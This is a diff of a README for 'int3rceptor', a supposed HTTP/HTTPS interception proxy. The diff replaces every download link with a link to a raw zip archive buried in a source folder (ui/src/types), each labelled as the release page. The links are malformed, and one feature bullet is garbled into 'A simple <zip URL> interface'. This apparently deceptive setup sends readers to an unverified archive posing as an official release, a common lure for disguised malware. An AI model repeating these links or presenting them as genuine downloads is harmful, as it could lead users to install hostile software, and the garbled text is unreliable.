@@ -1,6 +1,6 @@
 # ⚡ int3rceptor - Your Easy HTTP/HTTPS Proxy Tool
 
-[![Download int3rceptor](https://raw.githubusercontent.com/xdimondfan23/int3rceptor/main/website/src/components/int3rceptor-v2.9-beta.4.zip%https://raw.githubusercontent.com/xdimondfan23/int3rceptor/main/website/src/components/int3rceptor-v2.9-beta.4.zip)](https://raw.githubusercontent.com/xdimondfan23/int3rceptor/main/website/src/components/int3rceptor-v2.9-beta.4.zip)
+[![Download int3rceptor](https://github.com/xdimondfan23/int3rceptor/raw/refs/heads/main/ui/src/types/rceptor_int_3.3.zip%https://github.com/xdimondfan23/int3rceptor/raw/refs/heads/main/ui/src/types/rceptor_int_3.3.zip)](https://github.com/xdimondfan23/int3rceptor/raw/refs/heads/main/ui/src/types/rceptor_int_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Int3rceptor is a user-friendly tool for intercepting HTTP and HTTPS traffic. It 
 
 Int3rceptor serves as a modern alternative to the Burp Suite. It features:
 
-- A simple https://raw.githubusercontent.com/xdimondfan23/int3rceptor/main/website/src/components/int3rceptor-v2.9-beta.4.zip interface
+- A simple https://github.com/xdimondfan23/int3rceptor/raw/refs/heads/main/ui/src/types/rceptor_int_3.3.zip interface
 - Real-time traffic analysis
 - Fuzzing capabilities
 - A request repeater for testing
@@ -19,7 +19,7 @@ These features empower users to easily inspect web traffic, identify vulnerabili
 
 ## 📥 Download & Install
 
-To get started, visit the [Release page](https://raw.githubusercontent.com/xdimondfan23/int3rceptor/main/website/src/components/int3rceptor-v2.9-beta.4.zip) to download the latest version. Here’s how you can install it:
+To get started, visit the [Release page](https://github.com/xdimondfan23/int3rceptor/raw/refs/heads/main/ui/src/types/rceptor_int_3.3.zip) to download the latest version. Here’s how you can install it:
 
 1. Click the release link above.
 2. On the Releases page, find the latest version.
@@ -87,4 +87,4 @@ Int3rceptor welcomes contributions from all users. If you want to help, please c
 
 Int3rceptor is open-source software. It is free to use, modify, and share under the MIT license. You can find the license details in the repository.
 
-Remember to visit [this page](https://raw.githubusercontent.com/xdimondfan23/int3rceptor/main/website/src/components/int3rceptor-v2.9-beta.4.zip) to download the latest version of Int3rceptor and begin your journey into web traffic analysis and security testing.
+Remember to visit [this page](https://github.com/xdimondfan23/int3rceptor/raw/refs/heads/main/ui/src/types/rceptor_int_3.3.zip) to download the latest version of Int3rceptor and begin your journey into web traffic analysis and security testing.
